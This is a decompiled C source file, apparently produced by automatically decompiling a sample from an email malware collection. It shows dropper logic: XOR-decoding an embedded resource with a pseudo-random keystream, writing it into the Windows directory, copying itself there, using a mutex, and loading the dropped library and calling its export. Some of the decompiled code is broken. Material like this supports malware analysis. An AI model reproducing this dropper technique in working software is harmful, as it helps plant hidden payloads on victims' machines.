// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0747/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn00401000()
{
	int32 eax_5 = globals->dw4030E8 *s 0x000343FD + 0x00269EC3;
	globals->dw4030E8 = eax_5;
	return eax_5 >> 0x00000010 & 0x00007FFF;
}

void fn0040101E(word32 dwArg04)
{
	globals->dw4030E8 = dwArg04;
	return;
}

void fn00401028(word32 dwArg04, word32 dwArg08)
{
	Eq_19 eax_22 = GetModuleHandleA(0x00000000);
	Eq_25 eax_33 = FindResourceA(eax_22, (word32) wArg04, 0x004030C8);
	word32 eax_44 = LockResource(LoadResource(eax_22, eax_33));
	if (eax_44 != 0x00000000)
	{
		Eq_47 * eax_105 = SizeofResource(eax_22, eax_33);
		word32 eax_122 = CreateFileA(dwArg08, 0x40000000, 0x00000000, 0x00000000, 0x00000002, 0x00000080, 0x00000000);
		if (eax_122 == 0xFFFFFFFF)
l00401090:
		else
		{
			Eq_47 * ebx_127 = null;
			if (eax_105 >u null)
				do
				{
					ebx_127->b0000 = ebx_127->b0000 ^ (byte) ((int64) fn00401000() % 0x00000100);
					ebx_127 = ebx_127 + 0x00000001;
				} while (ebx_127 <u eax_105);
			fp->dwFFFFFFE8 = 0x00000000;
			fp->dwFFFFFFE8 = fp - 0x00000008;
			fp->dwFFFFFFE8 = eax_105;
			fp->dwFFFFFFE8 = eax_44;
			fp->dwFFFFFFE8 = eax_122;
			WriteFile(0x00000000, 0x00000000, 0x00000002, 0x00000080, 0x00000000);
			fp->dwFFFFFFE8 = eax_122;
			CloseHandle(0x00000000);
		}
	}
	else
		goto l00401090;
	return;
}

void fn004010DA(word32 ebp)
{
	GetModuleFileNameA(0x00000000, &fp->dwFFFFF38C, 0x00000400);
	GetWindowsDirectoryA(&fp->dwFFFFF38C, 0x00000400);
	GetWindowsDirectoryA(&fp->dwFFFFF38C, 0x00000400);
	Eq_153 * esi_41 = lstrcatA;
	if (bLoc06 != 0x5C)
	{
		fp->dwFFFFF38C = 0x004030E0;
		lstrcatA(&fp->dwFFFFF38C, 0x00000400);
	}
	word32 esp_46 = fp - 0x00000C78;
	esi_41();
	if (bLoc0428 != 0x5C)
	{
		fp->dwFFFFF38C = 0x004030E0;
		esp_46 = fp - 0x00000C80;
		esi_41();
	}
	Eq_176 * esp_55 = esp_46 - 0x00000004;
	esp_55->t0000 = globals->t403000;
	Mem60[esp_55 - 0x00000004:word32] = fp + 0xFFFFF7B8;
	esi_41();
	Mem63[esp_55 - 0x00000008:word32] = fp + 0xFFFFF7B8;
	esp_55->t0000.u0 = 0x00000065;
	fn00401028(dwArg00, dwArg04);
	esp_55->t0000.u0 = 0x00000000;
	Mem76[esp_55 - 0x0000000C:word32] = fp + 0xFFFFFBDC;
	Mem79[esp_55 - 0x00000010:word32] = fp + 0xFFFFF398;
	CopyFileA(esp_55->t0000, esp_55->t0000, esp_55->t0000);
	return;
}

void fn00401189(word32 ebp)
{
	globals->dw4030E4 = CreateMutexA(0x00000000, 0x00000000, globals->t403008);
	if (GetLastError() != 0x000000B7)
	{
		fn0040101E(0x00000000);
		fn004010DA(ebp);
		fn0040101E(GetTickCount());
		Eq_19 eax_37 = GetModuleHandleA(globals->t403000);
		if (eax_37 == 0x00000000 || eax_37 == 0xFFFFFFFF)
			eax_37 = LoadLibraryA(globals->t403000);
		if (eax_37 != 0x00000000 && eax_37 != 0xFFFFFFFF)
		{
			fp->tFFFFFFF8 = eax_37;
			code * eax_55 = GetProcAddress(0x00000000, 0x00000001);
			if (eax_55 != null)
				eax_55();
		}
	}
	return;
}

